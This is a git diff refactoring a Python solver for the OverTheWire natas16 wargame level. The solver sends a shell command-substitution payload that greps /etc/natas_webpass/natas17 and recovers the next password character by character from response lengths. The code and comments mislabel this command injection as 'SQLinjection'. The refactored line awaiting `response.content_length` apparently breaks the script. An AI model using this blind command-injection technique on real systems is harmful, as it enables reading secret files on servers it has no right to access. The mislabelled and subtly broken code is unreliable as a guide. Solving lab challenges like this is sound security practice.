@@ -4,16 +4,23 @@ import asyncio
 from halo import Halo
 
 
-async def get_password_request(session, data, character):
+SPINNER_TEXT = "The password for natas 17 is: "
+
+async def get_password_request(session, natas17_password, character):
+    """
+     If "African" is NOT the HTML body it means the SQLinjection was successful
+     and therefore the length of the HTML body its different than the others.
+    """
+    payload = f"African$(grep ^{natas17_password + character} /etc/natas_webpass/natas17)"
+    data = {"needle": payload}
     url = "http://natas16.natas.labs.overthewire.org/"
     async with session.post(url, data=data) as response:
 
-        return await response.text(), character
+        return await response.content_length, character
 
 
 async def get_password(session):
-    spinner = Halo(text='The password for natas 17 is: ',
-                   spinner='bouncingBar', color="blue")
+    spinner = Halo(text=SPINNER_TEXT, spinner="bouncingBar", color="blue")
     spinner.start()
 
     characters = string.ascii_letters + string.digits
@@ -23,24 +30,19 @@ async def get_password(session):
         tasks = []
 
         for character in characters:
-            # If "African" is in the HTML body it means the SQLinjection was not succesfull
-            payload = f"African$(grep ^{natas17_password + character} /etc/natas_webpass/natas17)"
-            data = {"needle": payload}
-            tasks.append(asyncio.ensure_future(get_password_request(session, data, character)))
+            tasks.append(asyncio.ensure_future(get_password_request(session, natas17_password, character)))
 
         requests = await asyncio.gather(*tasks)
         for response in requests:
-            """
-            The get_password_request return the HTML of the request and the character for the SQLinjection,
-            it keeps the html in response[0] and the character in response[1].
-            """
-            if len(response[0]) != 1122:
-                natas17_password += response[1]
+            response_length = response[0]
+            character_injected = response[1]
+            if response_length != 1122:
+                natas17_password += character_injected
                 spinner.stop()
-                spinner = Halo(text='The password for natas 17 is: ' + natas17_password,
-                            spinner='bouncingBar', color="blue")
+                spinner = Halo(text=SPINNER_TEXT + natas17_password, spinner="bouncingBar", color="blue")
                 spinner.start()
-    spinner.succeed(text="The password for natas 17 is: " + natas17_password)
+
+    spinner.succeed(text=SPINNER_TEXT + natas17_password)
 
     return natas17_password
 
@@ -48,7 +50,7 @@ async def get_password(session):
 async def make_session(natas16_password):
     """
     Create a session and start running an asynchronous function
-    that exploits the SQLinjection in natas 16.
+    that exploits the SQLinjection.
     """
     auth = aiohttp.BasicAuth("natas16", natas16_password)
     async with aiohttp.ClientSession(auth=auth) as session:
